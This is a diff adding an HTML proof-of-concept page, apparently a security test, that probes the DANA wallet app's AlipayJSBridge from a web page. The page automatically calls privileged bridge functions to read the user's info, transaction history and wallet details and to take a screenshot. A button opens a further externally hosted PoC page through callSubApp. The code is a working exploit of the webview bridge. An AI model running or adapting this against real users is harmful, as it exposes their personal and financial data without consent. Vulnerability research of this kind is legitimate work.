@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>DANA H5 Bridge Test v3</title>
+<style>
+  body{font-family:monospace;background:#111;color:#0f0;padding:12px;font-size:12px}
+  h3{color:#ff0;margin:14px 0 4px}
+  .ok{color:#0f0}.err{color:#f55}.pending{color:#888}
+  pre{white-space:pre-wrap;word-break:break-all;background:#000;padding:8px;border:1px solid #333;margin:4px 0;max-height:280px;overflow:auto}
+  button{background:#050;color:#0f0;border:1px solid #0f0;padding:10px;margin:6px 0;font-size:14px;width:100%}
+</style>
+</head>
+<body>
+<h3 style="color:#0ff">v3 - deep-dive: transactions, navigation, wallet cache, screenshot</h3>
+<h3>[1] Bridge presence</h3><pre id="p-bridge" class="pending">pending</pre>
+<h3>[2] getUserInfoData {event:getUserInfo} (re-confirm)</h3><pre id="p-info" class="pending">pending</pre>
+<h3>[3] getTransactionHistoryList {event:getInitList}</h3><pre id="p-hist" class="pending">pending</pre>
+<h3>[4] getNativeData {dataName:danaWalletDetail}</h3><pre id="p-native" class="pending">pending</pre>
+<h3>[5] screenshot {name:poc_v3}</h3><pre id="p-shot" class="pending">pending</pre>
+<h3>[6] callSubApp url=p2.html (tap button below)</h3><pre id="p-sub" class="pending">tap button</pre>
+<button onclick="goSubApp()">OPEN p2.html VIA callSubApp</button>
+<h3>[7] URL / environment</h3><pre id="p-env" class="pending">pending</pre>
+
+<script>
+(function(){
+  var log=function(id,obj){var el=document.getElementById(id);el.className='ok';try{el.textContent=typeof obj==='string'?obj:JSON.stringify(obj,null,1)}catch(e){el.textContent=String(obj)}};
+  var err=function(id,e){var el=document.getElementById(id);el.className='err';el.textContent='ERROR: '+(e&&e.message?e.message:String(e))};
+  log('p-env',{href:location.href,ua:navigator.userAgent});
+  function call(fn,param,cb){try{window.AlipayJSBridge.call(fn,param||{},function(r){cb(null,r)})}catch(e){cb(e)}}
+  function T(id,fn,param,delay){setTimeout(function(){call(fn,param,function(e,r){e?err(id,e):log(id,r)})},delay||600)}
+  function bridgeReady(cb){
+    if(window.AlipayJSBridge){cb();return}
+    document.addEventListener('AlipayJSBridgeReady',cb,false);
+    setTimeout(cb,4000);
+  }
+  window.goSubApp=function(){
+    log('p-sub','calling callSubApp...');
+    call('callSubApp',{url:'https://rfypych.github.io/poc/p2.html'},function(e,r){
+      var el=document.getElementById('p-sub');el.className='ok';
+      el.textContent='callSubApp callback: '+(e?('ERROR '+e.message):JSON.stringify(r));
+    });
+  };
+  bridgeReady(function(){
+    try{ log('p-bridge',{hasAlipayJSBridge:!!window.AlipayJSBridge,
+      appId:(window.AlipayJSBridge&&window.AlipayJSBridge.startupParams)?window.AlipayJSBridge.startupParams.appId:'n/a'});
+    }catch(e){err('p-bridge',e)}
+    T('p-info','getUserInfoData',{event:"getUserInfo"});
+    T('p-hist','getTransactionHistoryList',{event:"getInitList",pageNum:1,forceCache:false},1200);
+    T('p-native','getNativeData',{dataName:"danaWalletDetail"},1800);
+    T('p-shot','screenshot',{name:"poc_v3"},2400);
+  });
+})();
+</script>
+</body>
+</html>
